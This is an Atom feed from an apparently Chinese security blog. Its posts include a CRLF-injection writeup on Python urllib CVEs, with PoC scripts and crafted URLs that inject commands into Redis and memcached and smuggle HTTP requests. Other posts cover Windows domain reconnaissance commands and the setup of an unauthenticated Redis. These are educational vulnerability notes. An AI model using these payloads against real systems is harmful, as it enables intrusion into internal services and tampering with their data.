<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2020-03-12T15:03:20.637Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>浅析HRS漏洞</title>
    <link href="https://www.mi1k7ea.com/2020/03/11/%E6%B5%85%E6%9E%90HRS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2020/03/11/浅析HRS漏洞/</id>
    <published>2020-03-11T15:59:05.000Z</published>
    <updated>2020-03-12T15:03:20.637Z</updated>
    
    <content type="html"><![CDATA[<p>xxx</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="HRS" scheme="https://www.mi1k7ea.com/tags/HRS/"/>
    
  </entry>
  
  <entry>
    <title>Python urllib CRLF注入漏洞小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF注入漏洞小结/</id>
    <published>2020-03-09T15:05:41.000Z</published>
    <updated>2020-03-10T16:40:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Python urllib CRLF注入漏洞是很早的东西了，但是19年又新爆出两个CVE，这里就比较下这几个CVE利用注意点及区别吧。</p><h2 id="0x01-CRLF注入漏洞"><a href="#0x01-CRLF注入漏洞" class="headerlink" title="0x01 CRLF注入漏洞"></a>0x01 CRLF注入漏洞</h2><p>CRLF是“回车 + 换行”（\r\n）的简称，十六进制，码为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。因此，当我们能够控制HTTP消息头中的字符，注入一些恶意的换行比如一些会话Cookie或者HTML代码，这就是CRLF注入。</p><p>具体的可看到wooyun之前的文章：<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><h2 id="0x02-CVE-2016-5699"><a href="#0x02-CVE-2016-5699" class="headerlink" title="0x02 CVE-2016-5699"></a>0x02 CVE-2016-5699</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面：</p><p><code>http://10.10.10.10\r\nx-injected: header\r\ntest:8080</code></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>这部分直接引自参考的文章。</p><p>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p><p>漏洞验证代码如下，fetch3.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>本地开启nc监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345</span><br></pre></td></tr></table></figure><p>接着，正常运行访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1:12345/foo</span><br></pre></td></tr></table></figure><p>在nc中会接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1:12345</span><br></pre></td></tr></table></figure><p>现在，我们在IP地址和端口之间的分隔符即<code>:</code>之前进行CRLF注入，尝试注入两个HTTP头字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span><br></pre></td></tr></table></figure><p>然后在nc中接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可以看到，请求是正常发送的，并且在Host头字段处获取主机IP地址时成功进行了CRLF注入，即将X-injected和x-leftover这两个头字段都注入了进去。至此，攻击者就可以注入任意的HTTP头字段了。</p><p>另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询。</p><p>比如下面的CRLF注入会URL解析失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><p>但是下面的URL是可以正常解析并访问到127.0.0.1的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%00%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://www.cdxy.me/?p=660" target="_blank" rel="noopener">[CVE-2016-5699] Python HTTP header injection in urllib/urllib2</a></p><h2 id="0x03-CVE-2019-9740"><a href="#0x03-CVE-2019-9740" class="headerlink" title="0x03 CVE-2019-9740"></a>0x03 CVE-2019-9740</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080/test/?test=a</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面，但是和前者的区别在于注入新的端口：</p><p><code>http://10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</code></p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到请求报文中是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/1.png" alt=""></p><p>接着，我们试下攻击Redis，修改PoC脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:6379?\r\nSET hacker mi1k7ea\r\n"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>运行脚本，显示报错：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/2.png" alt=""></p><p>虽然报错，但是在Kali中的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/3.png" alt=""></p><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><h2 id="0x04-CVE-2019-9947"><a href="#0x04-CVE-2019-9947" class="headerlink" title="0x04 CVE-2019-9947"></a>0x04 CVE-2019-9947</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在端口号后面：</p><p><code>http://10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><p><code>http://10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span>)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="comment">#urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span></span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到两种形式的请求报文中都是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/4.png" alt=""></p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/5.png" alt=""></p><p>接着修改下PoC脚本来打内网Redis：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n'</span>)</span><br></pre></td></tr></table></figure><p>运行之后虽然报错，但在Kali的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/6.png" alt=""></p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="Http-Request-Smuggling"><a href="#Http-Request-Smuggling" class="headerlink" title="Http Request Smuggling"></a>Http Request Smuggling</h3><p>HRS即HTTP请求走私，在2005年的时候已被提出，只是最近圈内比较重视敏感信息泄露这块才被重新关注，可参考：</p><p>比如原始请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>根据HRS，攻击者可以追加注入一个完整的HTTP请求头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo</span><br></pre></td></tr></table></figure><p>此时请求包内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">POST /bar HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">&#123;&quot;new&quot;:&quot;json&quot;,&quot;content&quot;:&quot;here&quot;&#125;</span><br><span class="line">:12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>该请求在Apache HTTPD下是能成功利用的，但在其他的Web容器中就不一定能正确地解析利用了，这是需要前端服务和后端服务解析的二义性才能导致HRS攻击成功。</p><p>这种攻击可以用在内网攻击上，比如无认证的Rest接口等。</p><h3 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h3><p>如果Redis在本地未设置密码验证即存在未授权访问漏洞，那么攻击者可以组合Python urllib CRLF注入漏洞来攻击利用Redis未授权访问漏洞，通过其备份文件的功能实现写WebShell、SSH公钥和定时任务反弹shell等等。</p><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h3 id="Memcached未授权访问漏洞"><a href="#Memcached未授权访问漏洞" class="headerlink" title="Memcached未授权访问漏洞"></a>Memcached未授权访问漏洞</h3><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，即使没有对外开放端口，但攻击者还是可以组合Python urllib CRLF注入漏洞来通过命令交互来直接读入Memcached中的敏感信息。</p><p>如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo</span><br></pre></td></tr></table></figure><p>就会产生下面的HTTP头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">set foo 0 0 5</span><br><span class="line">ABCDE</span><br><span class="line">:11211</span><br></pre></td></tr></table></figure><p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br><span class="line">STORED</span><br><span class="line">ERROR</span><br><span class="line">ERROR</span><br></pre></td></tr></table></figure><p>经过确认，memcached中确实成功的插入了<code>foo</code>的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><p><a href="http://pages.strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
      <category term="CRLF注入" scheme="https://www.mi1k7ea.com/tags/CRLF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之域相关信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/03/08/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%9F%9F%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/03/08/内网信息收集之域相关信息收集/</id>
    <published>2020-03-08T09:23:51.000Z</published>
    <updated>2020-03-08T14:14:43.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-判断是否存在域"><a href="#0x01-判断是否存在域" class="headerlink" title="0x01 判断是否存在域"></a>0x01 判断是否存在域</h2><p>获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。</p><h3 id="ipconfig命令"><a href="#ipconfig命令" class="headerlink" title="ipconfig命令"></a>ipconfig命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令即可查看网管IP、DNS IP、域名、本机是否和DNS服务器出于同一网段等信息。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/1.png" alt=""></p><p>然后就可以通过反向解析命令nslookup来解析域名的IP地址，用解析得到的IP地址进行对比，判断DC和DNS服务是否在同一台服务器上。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/2.png" alt=""></p><h3 id="查看系统详细信息"><a href="#查看系统详细信息" class="headerlink" title="查看系统详细信息"></a>查看系统详细信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>显示项的“域”即域名，“登录服务器”即域控制器。若“域”为“WORKGROUP”则表示当前机器不在域内。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/3.png" alt=""></p><h3 id="查询当前登录域及登录用户信息"><a href="#查询当前登录域及登录用户信息" class="headerlink" title="查询当前登录域及登录用户信息"></a>查询当前登录域及登录用户信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中），“登录域”用于表示当前登录的用户是域用户还是本地用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/4.png" alt=""></p><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p>该命令用于判断主域（域服务器通常会同时作为时间服务器使用），执行后通常会有如下三种情况：</p><p>1、存在域，但当前用户不是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/6.png" alt=""></p><p>2、存在域，且当前用户是域用户。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/5.png" alt=""></p><p>3、当前网络环境为工作组，不存在域。</p><p><img src="/2020/03/08/内网信息收集之域相关信息收集/7.png" alt=""></p><h2 id="0x02-探测域内存活主机"><a href="#0x02-探测域内存活主机" class="headerlink" title="0x02 探测域内存活主机"></a>0x02 探测域内存活主机</h2><h3 id="利用NetBIOS探测内网"><a href="#利用NetBIOS探测内网" class="headerlink" title="利用NetBIOS探测内网"></a>利用NetBIOS探测内网</h3>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Redis安全小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/05/Redis%E5%AE%89%E5%85%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/05/Redis安全小结/</id>
    <published>2020-03-05T14:29:30.000Z</published>
    <updated>2020-03-10T14:48:19.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p><p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><p>Redis服务的默认端口是6379。</p><p>官网查看更多信息：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p><ul><li>查看信息：info</li><li>删除所有数据库内容：flushall</li><li>刷新数据库：flushdb</li><li>查看所有键：keys *，使用select num可以查看键值数据</li><li>设置变量：set aaa “mi1k7ea”</li><li>查看变量值：get aaa</li><li>查看备份文件路径：config get dir</li><li>设置备份文件路径：config set dir dirpath</li><li>查看备份文件名：config get dbfilename</li><li>设置备份文件名：config set dbfilename filename</li><li>保存备份文件：save</li></ul><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p>这里搭建漏洞版本的Redis服务，同时配置服务进行全网监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并解压运行make</span></span><br><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br><span class="line">tar zxf redis-3.2.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.11/</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入src目录中将redis-server和redis-cli复制到/usr/bin目录下，方便命令识别</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">cp redis-server /usr/bin/</span><br><span class="line">cp redis-cli /usr/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将redis.conf复制到/etc/目录下</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑/etc/中的redis配置文件redis.conf</span></span><br><span class="line">vim /etc/redis.conf</span><br><span class="line"><span class="comment">#注释掉本地绑定，允许除本地外的主机远程访问Redis服务</span></span><br><span class="line"><span class="comment">##bind 127.0.0.1</span></span><br><span class="line"><span class="comment">#关闭保护模式，允许远程连接Redis服务</span></span><br><span class="line"><span class="comment">#protected-mode no</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用/etc/目录下的redis.conf文件中的配置来启动Redis服务</span></span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.137 -p 6379</span><br></pre></td></tr></table></figure><h3 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" 